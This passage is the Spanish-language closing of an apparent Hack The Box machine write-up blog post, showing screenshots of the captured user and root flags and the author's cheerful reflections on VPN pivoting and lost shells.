VAYA LOCURA DE CAMINOOOOOOOo, nos vemooooooooos...

Ah no, faltan las flags :P

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/static/355flags_user.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/static/355flags_root.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

FIIIIIIIIIIIIIIIIIIIIIIIIIN

...

Una vaina loca loca, la parte de las VPN es brutal y el c√≥mo pivoteamos es m√°s brutal a√∫n, aunque perd√≠ muuuuuchas shells por esto, pero no pasa nada jajaj :(

Me gusto bastante la m√°quina, toda siempre centrada en un proceso, bastante genial.

Y bueno, y malo, nos leeremos despu√©s, pero nada de dejar de romper cosas eh!! ¬°Nada de eso! A ROMPER TODOOOOOOOOOOO!!